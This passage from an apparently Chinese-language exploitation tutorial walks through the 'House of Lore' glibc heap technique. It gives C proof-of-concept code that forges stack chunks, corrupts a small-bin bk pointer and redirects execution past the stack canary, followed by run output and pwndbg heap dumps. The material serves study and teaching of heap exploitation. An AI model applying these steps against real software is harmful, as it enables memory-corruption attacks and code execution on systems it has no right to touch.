stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWelcome to the House of Lore\n&quot;</span>);<br>  <span class="hljs-comment">//这个版本也可以绕过glibc malloc引入的强化检查</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);                                                                                                        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;</span>);<br>  <span class="hljs-comment">//分配victim chunk(100)</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-comment">//这时堆上的第一个small chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);<br><br>  <span class="hljs-comment">//我们需要去掉头部大小才能得到真正的victim地址</span><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk                                                                                                         intptr_t *victim_chunk = victim-2;</span><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-comment">//在栈上创建一个fake chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack\n&quot;</span>);<br>  <span class="hljs-comment">//我们把fwd指针指向victim_chunk来绕过第二个malloc到最后一个malloc上small bin corrupted的检查,这样就可以将我们的栈地址写到small bin list里了</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span><br>         <span class="hljs-string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-comment">//将我们的bk指针指向stack_buffer_2并且将stack_buffer_2的fwd指针指向stack_buffer_1来绕过最后一个malloc上small bin corrupted的检查,这样就可以在栈上返回一个假的chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buff                                                                                                 er_1 &quot;</span><br>         <span class="hljs-string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span>                                                                                                               <span class="hljs-string">&quot;chunk on stack&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-comment">//分配另一个large bin来避免small bin在free的时候与top chunk合并</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br>         <span class="hljs-string">&quot;the small one during the free()\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);<br><br>  <span class="hljs-comment">//free顶块,此时会将它放进unsorted bin中</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing ttop he chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-comment">//在unsorted bin中,victim的fwd和bk指针都是0</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//现在调用一个不会被unsorted bin或者small bin处理的malloc</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);<br>  <span class="hljs-comment">//这也意味着chunk victim会被插入到smallbin的最前面</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2                                                                                                 );<br>  <span class="hljs-comment">//victim chunk已经被排序并且他的fwd和bk指针也被更新了</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>  <span class="hljs-comment">//现在假设我们有一个漏洞可以覆盖victim-&gt;bk指针</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br>  <br>  <span class="hljs-comment">//victim-&gt;bk正指向栈上</span><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack </span><br><br>  <span class="hljs-comment">//------------------------------------</span><br>  <span class="hljs-comment">//现在我们分配一个和我们第一次free大小一样的chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);<br>  <span class="hljs-comment">//这个操作将会给我们返回已经被覆写的victim chunk并且将bin-&gt;bk指向被注入的victim-&gt;bk指针</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);<br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br>  <span class="hljs-comment">//这个最后一次的malloc将欺骗glibc malloc返回一个在bin-&gt;bk中被注入的chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = malloc(100)\n&quot;</span>);<br>  <span class="hljs-comment">//而stack_buffer_2的fwd指针也在最后一次的malloc中被修改了</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,<br>         stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="hljs-comment">// this chunk will be allocated on stack</span><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-built_in">memcpy</span>((p4<span class="hljs-number">+40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs smali">Welcome to the House of Lore<br>This is a revisited version that bypass also the hardening<span class="hljs-built_in"> check </span>introduced by glibc malloc<br>This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23<br><br>Allocating the victim chunk<br>Allocated the first small chunk on the heap at 0x81c010<br>stack_buffer_1 at 0x7ffeea058c50<br>stack_buffer_2 at 0x7ffeea058c30<br>Create a fake chunk on the stack<br>Set the fwd pointer to the victim_chunk in order to bypass the<span class="hljs-built_in"> check </span>of small bin corruptedin second to the last malloc, which putting stack address on smallbin list<br>Set the bk pointer to stack_buffer_2<span class="hljs-built_in"> and </span>set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the<span class="hljs-built_in"> check </span>of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()<br>Allocated the large chunk on the heap at 0x81c080<br>Freeing the chunk 0x81c010, it will be inserted in the unsorted bin<br><br>In the unsorted bin the victim&#x27;s fwd<span class="hljs-built_in"> and </span>bk pointers are nil<br>victim-&gt;fwd: (nil)<br>victim-&gt;bk: (nil)<br><br>Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin<br>This means that the chunk 0x81c010 will be inserted in front of the SmallBin<br>The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x81c470<br>The victim chunk has been sorted<span class="hljs-built_in"> and </span>its fwd<span class="hljs-built_in"> and </span>bk pointers updated<br>victim-&gt;fwd: 0x7f5b68740bd8<br>victim-&gt;bk: 0x7f5b68740bd8<br><br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>Now allocating a chunk with size equal to the first one freed<br>This should<span class="hljs-built_in"> return </span>the overwritten victim chunk<span class="hljs-built_in"> and </span>set the bin-&gt;bk to the injected victim-&gt;bk pointer<br>This last malloc should trick the glibc malloc to<span class="hljs-built_in"> return </span>a chunk at the position injected in bin-&gt;bk<br>p4 = malloc(100)<br><br>The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f5b68740bd8<br><br>p4 is 0x7ffeea058c60<span class="hljs-built_in"> and </span>should be on the stack!<br>Nice jump d00d<br></code></pre></td></tr></table></figure><h2 id="关键代码调试"><a href="#关键代码调试" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>断点如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">42</span>   <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>► <span class="hljs-number">43</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);<br><br>  <span class="hljs-number">54</span>   stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">55</span>   stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">56</span>   stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br>  <span class="hljs-number">57</span><br>► <span class="hljs-number">58</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span><br><br>  <span class="hljs-number">61</span>   stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  <span class="hljs-number">62</span>   stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br>  <span class="hljs-number">63</span><br>► <span class="hljs-number">64</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br><br>  <span class="hljs-number">66</span>   <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>► <span class="hljs-number">67</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);<br><br>  <span class="hljs-number">71</span>   <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br>  <span class="hljs-number">72</span><br>► <span class="hljs-number">73</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);<br><br>  <span class="hljs-number">80</span>   <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br>► <span class="hljs-number">81</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);<br><br>   <span class="hljs-number">91</span>   victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>   <span class="hljs-number">92</span><br>   <span class="hljs-number">93</span>   <span class="hljs-comment">//------------------------------------</span><br>   <span class="hljs-number">94</span><br>►  <span class="hljs-number">95</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);<br><br>   <span class="hljs-number">98</span>   <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>   <span class="hljs-number">99</span><br>  <span class="hljs-number">100</span><br>► <span class="hljs-number">101</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br><br>   <span class="hljs-number">102</span>   <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>► <span class="hljs-number">103</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = malloc(100)\n&quot;</span>);<br><br>  <span class="hljs-number">109</span>   <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-number">110</span>   <span class="hljs-built_in">memcpy</span>((p4<span class="hljs-number">+40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br>► <span class="hljs-number">111</span> &#125;<br><br></code></pre></td></tr></table></figure><p>下面直接运行,首先是malloc 了victim</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs delphi">pwndbg&gt; heap<br><span class="hljs-number">0</span>x603000 FASTBIN <span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  prev_size = 0,</span><br><span class="hljs-comment">  size = 113,</span><br><span class="hljs-comment">  fd = 0x0,</span><br><span class="hljs-comment">  bk = 0x0,</span><br><span class="hljs-comment">  fd_nextsize = 0x0,</span><br><span class="hljs-comment">  bk_nextsize = 0x0</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-number">0</span>x603070 PREV_INUSE <span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  prev_size = 0,</span><br><span class="hljs-comment">  size = 135057,</span><br><span class="hljs-comment">  fd = 0x0,</span><br><span class="hljs-comment">  bk = 0x0,</span><br><span class="hljs-comment">  fd_nextsize = 0x0,</span><br><span class="hljs-comment">  bk_nextsize = 0x0</span><br><span class="hljs-comment">&#125;</span><br>pwndbg&gt; p stack_buffer_1<br><span class="hljs-number">$1</span> = <span class="hljs-comment">&#123;0x0, 0x0, 0x0, 0x0&#125;</span><br>pwndbg&gt; p stack_buffer_2<br><span class="hljs-number">$2</span> = <span class="hljs-comment">&#123;0x0, 0x0, 0x0&#125;</span><br>pwndbg&gt; p &amp;stack_buffer_1<br><span class="hljs-number">$3</span> = (intptr_t *<span class="hljs-comment">(*)[4]) 0x7fffffffe620</span><br><span class="hljs-comment">pwndbg&gt; p &amp;stack_buffer_2</span><br><span class="hljs-comment">$4 = (intptr_t *(*)</span>[<span class="hljs-number">3</span>]) <span class="hljs-number">0</span>x7fffffffe600<br></code></pre></td></tr></table></figure><p>然后程序修改了stack_buffer_1的值</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gams">pwndbg&gt; p stack_buffer_1<br><span class="hljs-meta"><span class="hljs-keyword">$5</span> = &#123;0x0, 0x0, 0x603000, 0x0&#125;</span><br><span class="hljs-comment">//我们所伪造的stack_buffer_1</span><br><span class="hljs-meta"><span class="hljs-keyword">$6</span> = &#123;</span><br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0x603000</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x7fffffffe730</span>,<br>  bk_nextsize = <span class="hljs-number">0x2f7024547d2ca600</span><br>&#125;<br></code></pre></td></tr></table></figure><p>第二次修改</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$7</span> = &#123;</span><br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0x603000</span>,<br>  bk = <span class="hljs-number">0x7fffffffe600</span>,<br>  fd_nextsize = <span class="hljs-number">0x7fffffffe730</span>,<br>  bk_nextsize = <span class="hljs-number">0x2f7024547d2ca600</span><br>&#125;<br>pwndbg&gt; p stack_buffer_1<br><span class="hljs-meta"><span class="hljs-keyword">$8</span> = &#123;0x0, 0x0, 0x603000, 0x7fffffffe600&#125;</span><br></code></pre></td></tr></table></figure><p>现在分配了p5来避免free victim的时候被合并到top chunk中</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">113</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603070</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1009</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603460</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134049</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>紧接着free掉了victim，此时我们的victim被放进了fast bin中</p><p>为什么是fast bin而不是程序中所说的unsorted bin这里我说一下，程序原本希望在32位机上测试的，但我的机子是64位的，100的chunk &lt; max_fast(128)所以被放进了fastbin中，但如果是32位机子的话，100&gt;max_fast(64)因此被放入了unsorted bin中 )</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x603000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>现在就需要我们分配一个既不是unsorted bin又不是small bin的chunk了，一个超大的chunk会从top chunk里分一块出来，然后系统会把unsorted bin中的chunk塞入属于他的bins中</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">113</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bd8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">184</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bd8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">184</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603070 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">112</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1008</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603460 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1217</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603920 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">132833</span>,<br>  <span class="hljs-attr">fd</span> <span 